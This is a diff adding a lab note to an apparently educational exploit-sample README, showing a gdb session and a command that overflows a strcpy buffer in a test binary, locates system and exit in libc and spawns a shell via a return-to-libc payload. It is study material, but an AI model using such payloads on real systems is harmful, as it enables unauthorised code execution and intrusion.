@@ -1,3 +1,57 @@
+Shawn the R0ck - Dec 30 2013
+-----------------------------------
+It's an example of ROP..basically yes...
+
+shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ export BINSH="      /bin/sh"
+shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ ./getenvaddr BINSH ./rop_vuln
+BINSH will be at 0xbfffff7d
+shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ gdb ./rop_vuln -q
+Reading symbols from /home/shawn/citypw-SCFE/security/overwrite_dtors/rop_vuln...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x804841f
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804841c <+0>:	push   %ebp
+   0x0804841d <+1>:	mov    %esp,%ebp
+   0x0804841f <+3>:	and    $0xfffffff0,%esp
+   0x08048422 <+6>:	sub    $0x20,%esp
+   0x08048425 <+9>:	mov    0xc(%ebp),%eax
+   0x08048428 <+12>:	add    $0x4,%eax
+   0x0804842b <+15>:	mov    (%eax),%eax
+   0x0804842d <+17>:	mov    %eax,0x4(%esp)
+   0x08048431 <+21>:	lea    0x1b(%esp),%eax
+   0x08048435 <+25>:	mov    %eax,(%esp)
+   0x08048438 <+28>:	call   0x8048300 <strcpy@plt>
+   0x0804843d <+33>:	mov    $0x0,%eax
+   0x08048442 <+38>:	leave  
+   0x08048443 <+39>:	ret    
+End of assembler dump.
+(gdb) 
+(gdb) r $(python -c 'print "A" * 21')
+Starting program: /home/shawn/citypw-SCFE/security/overwrite_dtors/rop_vuln $(python -c 'print "A" * 21')
+
+Breakpoint 1, 0x0804841f in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e9bf10 <system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e8f550 <exit>
+
+shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ ./rop_vuln `python -c 'print "A" * 17 + "\x10\xbf\xe9\xb7" + "\x50\xf5\xe8\xb7" + "\x7d\xff\xff\xbf"`
+-bash: command substitution: line 1: unexpected EOF while looking for matching `''
+-bash: command substitution: line 2: syntax error: unexpected end of file
+Segmentation fault
+shawn@kali-test:~/citypw-SCFE/security/overwrite_dtors$ ./rop_vuln `python -c 'print "A" * 17 + "\x10\xbf\xe9\xb7" + "\x50\xf5\xe8\xb7" + "\x7d\xff\xff\xbf"'`
+$ id
+uid=1000(shawn) gid=1001(shawn) groups=1001(shawn)
+$ exit
+
+
+--------------------------------------------------------------------------
 This sample is going to show you how to overwrite the .dtors
 section. You should read the book Hacking: The Art of Exploitation,
 2nd Edition if you wanna know more details. Turn off the ASLR at
